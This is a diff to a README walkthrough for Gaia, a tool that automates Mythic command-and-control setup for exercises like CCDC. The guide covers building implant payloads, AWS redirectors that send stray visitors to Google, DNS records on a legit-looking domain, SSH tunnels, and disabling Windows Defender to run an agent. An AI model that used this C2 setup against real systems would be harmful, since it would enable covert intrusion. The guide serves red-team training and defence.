@@ -56,7 +56,7 @@ Modules:
     redirector                                          Manage redirector configuration within public clouds
 (.venv) PS C:\tools\gaia_guide\Gaia>
 ```
-
+# Installing Mythic
 Next, time to install Mythic and it's prerequisites. Note, this takes a while. Go grab some coffee, beer, snacks, whatever you want. Toss on a YouTube video while you are at it and come back to this in a bit. 
 A quick note here is that any server you connect to with Gaia will automatically be added to `~/.ssh/known_hosts`. This is to prevent the need to have Gaia require manual intervention in the event it's deployment were to be entirely scripted out. So, if you check `~/.ssh/known_hosts` and see a bunch of random boxes in there over time, Gaia could be the cause. Especially if you use it to spin up and down redirectors often.
 ```
@@ -111,8 +111,9 @@ Cleaning up install_mythic.sh script
 #######################################
 NOTE: If the password for `mythic_admin` is lost, run `grep "MYTHIC_ADMIN_PASSWORD" /opt/Mythic/.env | cut -d '"' -f 2` on the server mythic is installed on.
 ```
-Yes, there are creds in there. No I don't care. The password is randomly generated and this server will be long gone before this hits GitHub. So, now we have Mythic functional. If you are already familiar with Mythic and don't care about the rest of Gaia's features, you're off to the races! For the rest of us, let's continue!
+Yes, there are creds in there. No I don't care. The password is randomly generated and this server will be long gone before this hits GitHub. So, now we have Mythic functional. If you are already familiar with Mythic and don't need the rest of Gaia's features, you're off to the races! For the rest of us, let's continue! 
 
+# Authenticating to Mythic
 Next up we need to authenticate to Mythic so we can interact with it's API. We see when requesting help with the `auth` command, that there are 2 values pre-populated. Those are defaults that can be overridden.
 ```
 (.venv) PS C:\tools\gaia_guide\Gaia> .\gaia.py auth -h
@@ -133,8 +134,9 @@ Password:
 API token dumped to .env file
 Mythic authentication successful!
 ```
-If you inspect your `.env` file, you'll notice that `MYTHIC_LOGIN_SERVER_HOST`, `MYTHIC_LOGIN_SERVER_PORT` and `MYTHIC_API_KEY` have automatically been populated for you. I will not be showing mine through this guide because it will have API keys that I actually use and would like to not have cryptominers or AI related charges to my credit card. 
+If you inspect your `.env` file, you'll notice that `MYTHIC_LOGIN_SERVER_HOST`, `MYTHIC_LOGIN_SERVER_PORT`, `MYTHIC_API_KEY` and `MYTHIC_SERVER_USER` have automatically been populated for you. I will not be showing mine through this guide because it will have API keys that I actually use and would like to not have cryptominers or AI related charges to my credit card. Note this means if you have the relevant value populated in `.env` already, Gaia will automatically pull it if you don't specify it in the CLI, or will update the value if you do specify it in the CLI.
 
+# User Creation
 Now we have authenticated to Mythic. Let's create new users. We can do this in 2 ways. Either providing username via the CLI or through a file. Let's start with the CLI. We will also output the passwords to the terminal.
 ```
 (.venv) PS C:\tools\gaia_guide\Gaia> .\gaia.py user create -u test1 --cred-stdout
@@ -179,8 +181,9 @@ test5:OuCajjPD3LseR0Ko
 test6:2ywzXrH0DQS3XWDB
 ```
 
-Note that if you end up specifying the same user, you could have some issues. I'd recommend going into Hasura and deleting the user records from the operator table and re-creating them. In case of a user conflict, use the newer credentials if you don't want to go to hasura to delete the users first. You can get to Hasura in the Mythic UI, then retrieve the password by running `sudo cat /opt/Mythic/.env | grep HASURA_SECRET`.
+Note that if you end up specifying the same user, you could have some issues. I'd recommend going into Hasura and deleting the user records from the operator table and re-creating them. In case of a user conflict, use the newer credentials if you don't want to go to hasura to delete the users first. You can get to Hasura in the Mythic UI, then retrieve the password by running `sudo cat /opt/Mythic/.env | grep HASURA_SECRET`. Future versions of Gaia will support more robust user management.
 
+# Operation Creation
 Now, let's check out what operations are available to us.
 ```
 (.venv) PS C:\tools\gaia_guide\Gaia> .\gaia.py operation list
@@ -189,7 +192,7 @@ Operation Chimera
 ```
 Looks like it's just the default Operation Chimera. Since this is a fresh install, this is expected. 
 
-Next up, time to create a new operation and assign some users. Lets start by creating a new operation. Creating a new operation will also update the respective value in `.env`.
+Next up, time to create a new operation and assign some users. Lets start by creating a new operation. Creating a new operation will also update `MYTHIC_OPERATION_NAME` in `.env`.
 ```
 (.venv) PS C:\tools\gaia_guide\Gaia> .\gaia.py operation create -n SpecterOp
 ```
@@ -203,7 +206,8 @@ Assigned user test2 to operation SpecterOp
 Assigned user test3 to operation SpecterOp
 ```
 
-Okay, we have some users, and we have some operations. Let's start by getting a local payload. This payload will be executed from the Mythic server because I am lazy and don't want to spin up another VM. We can use either Athena or Poseidon for this. I prefer Poseidon personally. The amount of time it will take to build these payloads will vary greatly based on how powerful your Mythic server is. You can safely ignore that last line, I'm not sure what causes it yet but it's harmless. When you execute this command, `.env` updates with the callback URL, the port, and killdate.
+# Payload Creation
+Okay, we have some users, and we have some operations. Let's start by getting a local payload. This payload will be executed from the Mythic server because I am lazy and don't want to spin up another VM. We can use either Athena or Poseidon for this. I prefer Poseidon personally. The amount of time it will take to build these payloads will vary greatly based on how powerful your Mythic server is. You can safely ignore that last line, I'm not sure what causes it yet but it's harmless. When you execute this command, `.env` updates the `MYTHIC_HTTP_CALLBACK_URL_BASE`, `MYTHIC_HTTP_CALLBACK_PORT`, and `MYTHIC_HTTP_CALLBACK_KILLDATE` values.
 ```
 (.venv) PS C:\tools\gaia_guide\Gaia> .\gaia.py payload create poseidon -n notposeidon -u http://192.168.153.133 -k 2026-08-09 -p 80 -o linux
 Poseidon linux x64 elf building
@@ -233,6 +237,7 @@ Once you execute the payload, the terminal will hang. If you go back to your Myt
 
 If you were only looking for how to use Gaia locally, or in a lab, you're all done here! At this point it's time to showcase using Gaia to create payloads that go over the internet and through redirectors before landing in your Mythic server!
 
+# Shifting to redirectors
 Next, let's create an Apollo payload that goes to `www.thislookslegit.net` for use with a redirector we will create later. We are doing this over https and specifying port 443 this time. Note you want this to be a domain you own so you can create records for it. 
 ```
 (.venv) PS C:\tools\gaia_guide\Gaia> .\gaia.py payload create apollo -n notapollo -u https://www.thislookslegit.net -k 2026-08-09 -p 443
@@ -248,7 +253,7 @@ Ignoring exception in _clean_close: ConnectionClosedError(None, None, None)
 If you check Mythic again, you'll see the new payloads in the payloads menu.
 ![Apollo Payloads](readme_images/apollo_create.png)
 
-
+## Creating Redirectors
 So, next we need to create a redirector. Fortunately, the help menu in Gaia essentially acts as a todo list, with the exception of delete. Deleting infra just after making it would be silly.
 ```
 (.venv) PS C:\tools\gaia_guide\Gaia> .\gaia.py redirector -h
@@ -271,7 +276,7 @@ Redirector Actions:
 First up, creating the redirector. As of now, only AWS is supported but Azure is planned to be supported in the future. Let's get the help menu.
 ```
 (.venv) PS C:\tools\gaia_guide\Gaia> .\gaia.py redirector create aws -h
-usage: gaia redirector create aws [-h] [-a] [-s] -S {t2.micro,t2.small,t2,medium,t3.micro,t3.small,t3.medium} [-r REGION] -o {debian,ubuntu}
+usage: gaia redirector create aws [-h] [-a] [-s] -S {t2.small,t2,medium,t3.micro,t3.small,t3.medium} [-r REGION] -o {debian,ubuntu}
 
 options:
   -h, --help                                                            show this help message and exit
@@ -298,7 +303,7 @@ Once the EC2 is built, then Gaia handles some post-build configuration:
 7. Creates an empty `.htaccess` file at `/var/www/html`
 8. Installs Certbot
 
-Here's what all that looks like (to some extent, the output is long). Note also that the AWS access key, AWS secret key, and AWS region, public IP, OS, and Username will be dumped into `.env`.
+Here's what all that looks like (to some extent, the output is long). `.env` will update the following values `AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`, `AWS_DEFAULT_REGION`, `REDIRECTOR_PUBLIC_IP`, `REDIRECTOR_OS`, `REDIRECTOR_USER`
 ```
 (.venv) PS C:\tools\gaia_guide\Gaia> .\gaia.py redirector create aws -S t3.micro -r us-east-2 -o debian -a -s
 AWS Access Key:
@@ -329,7 +334,8 @@ ID: i-0da415d00a5d16257  Status: running  Size: t3.micro  Arch: x86_64  Public I
 ```
 Gaia determines that a redirector was created by it by tagging `createdBy:gaia` on EC2 resource creation. When Gaia queries for EC2 instances, it uses this tag to determine if it's Gaia affiliated or not, then skips the resource if it's not.
 
-We then need to make a quick jump over to DNS config. Time to get an A record created for the server, but first, to figure out what's in our Porkbun account. When we auth to Porkbun with the API keys, they get dumped into `.env`.
+## DNS Configuration
+We then need to make a quick jump over to DNS config. Time to get an A record created for the server, but first, to figure out what's in our Porkbun account. When we auth to Porkbun with the API keys, the `PORKBUN_API_KEY` and `PORKBUN_SECRET_KEY` gets updated to `.env`.
 ```
 (.venv) PS C:\tools\gaia_guide\Gaia> .\gaia.py dns porkbun list -k -s
 Porkbun API Key:
@@ -341,7 +347,6 @@ thislookslegit.net
 The idea here is to have with a blank throwaway domain you'd use for C2 and nothing else. This is best so you don't degrade your trust ratings on your legitimate domains. So, I'm assuming that you have a domain that doesn't have anything else in it. So we can use `thislookslegit.net` as our C2 domain.
 ```
 .\gaia.py dns porkbun list --domain thislookslegit.net
-Name: www.thislookslegit.net  Type: A  Value: 13.59.54.21
 Name: thislookslegit.net  Type: MX  Value: fwd1.porkbun.com
 Name: thislookslegit.net  Type: MX  Value: fwd2.porkbun.com
 Name: thislookslegit.net  Type: NS  Value: curitiba.porkbun.com
@@ -363,8 +368,8 @@ Let's check Porkbun to make sure the record was added properly. The other domain
 
 ![New A Record in Porkbun](readme_images/porkbun_a_create.png)
 
-
-Next, creating a certificate with `certbot`. This will enable HTTPS on your redirector site.
+## Requesting TLS Certificates
+Next, creating a certificate with `certbot`. This will enable HTTPS on your redirector site. This will also update `REDIRECTOR_PUBLIC_HOST` in `.env` with the value of `-S`. `-S` can also be the FQDN of the redirector.
 ```
 (.venv) PS C:\tools\gaia_guide\Gaia> .\gaia.py redirector certbot -d www.thislookslegit.net -S 13.59.54.21 -u admin -i C:\\users\\winterknight\\.ssh\\gaia-redir.pem
 Connecting to redirector.
@@ -391,6 +396,7 @@ If you like Certbot, please consider supporting our work by:
 - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
 ```
 
+## Generate redirector rules
 Time to get the UUID of a payload so we can create our `mod_rewrite` rules for it. In this case we want the `notapollo.exe` payload.
 ```
 (.venv) PS C:\tools\gaia_guide\Gaia> .\gaia.py payload list
@@ -444,6 +450,7 @@ RewriteRule ^.*$ "https://www.google.com" [L,R=302]
 ########################################
 ```
 
+## Connect Redirector to the Mythic Server
 If you go to the website that the redirector hosts now, you'll notice you wind up on Google instead. Awesome. Almost done! Time to build out the SSH tunnel, then fire that payload. Which means reading more docs.
 ```
 (.venv) PS C:\tools\gaia_guide\Gaia> .\gaia.py redirector tunnel -h
@@ -472,7 +479,7 @@ Copying finished systemd service file to Mythic server, enabling the new service
 SSH tunnel and service successfully created!
 ```
 
-
+## Payload Test
 Time to test the payload! Since Apollo is *not evasive*, we will first need to turn off Windows Defender.
 ![Disabling Defender](readme_images/defender_gone.png)
 
@@ -488,7 +495,12 @@ PS C:\tools> .\apollo.exe
 
 And if you did it all correctly, you should see a callback going through the redirector! 
 ![Callbacks with Apollo going through Redirector](readme_images/apollo_callback.png)
-For CCDC, this is more or less where infrastructure stops. However, we don't want to rack up AWS charges all day, so lets take the infrastructure down. First thing we will have to do is stop payload execution either by using `CTRL+C` or Task Manager. Once that's done, we will delete the EC2 and it's associated components. Gaia identifies components to delete using those `createdBy:gaia` tags I mentioned when we spun up the redirector. It searches for EC2 Keypairs, Security Groups, and Instances with those tags before deleting them.
+
+# Tearin' it down!
+For CCDC, this is more or less where infrastructure stops. However, we don't want to rack up AWS charges all day, so lets take the infrastructure down. First thing we will have to do is stop payload execution either by using `CTRL+C` or Task Manager. 
+
+## Tearing down Redirectors
+Once that's done, we will delete the EC2 and it's associated components. Gaia identifies components to delete using those `createdBy:gaia` tags I mentioned when we spun up the redirector. It searches for EC2 Keypairs, Security Groups, and Instances with those tags before deleting them.
 ```
 (.venv) PS C:\tools\gaia_guide\Gaia> .\gaia.py redirector delete aws
 Getting Gaia EC2s from AWS
@@ -503,6 +515,7 @@ Gaia cleanup complete!
 ```
 If you check your AWS console, you'll notice that the EC2 is gone, along with the `Webservers` security group, and the `gaia-redir.pem` keypair. You will also notice that `~/.ssh/gaia-redir.pem` was deleted from your local system, so Gaia does not leave SSH keys on your system once they are of no more use. 
 
+## Deleting DNS records
 Next up, deleting the A record we created earlier. Despite the resource that backed it being gone, it used a public IP address from AWS. At some point, another EC2 could spin up and take the IP, effectively hijacking the domain. This is a way to perform a subdomain takeover. 
 ```
 (.venv) PS C:\tools\gaia_guide\Gaia> .\gaia.py dns porkbun delete -d thislookslegit.net -n www
@@ -525,6 +538,7 @@ Here's the view from the web app.
 
 ![Porkbun domains after deletion](readme_images/porkbun_after_delete.png)
 
+## Dealing with the Mythic Server
 At this point, feel free to revert the Mythic server to a VM image to a snapshot from before you installed Mythic, or delete the VM. If you are running on bare-metal, you can delete the docker containers if you wish. The way I use Gaia is by reverting the VM back to just after installation. 
 
 Thanks for checking Gaia out! I hope it and this guide helps you better understand how C2s work, and help you come up with strategies to counter them in the wild.
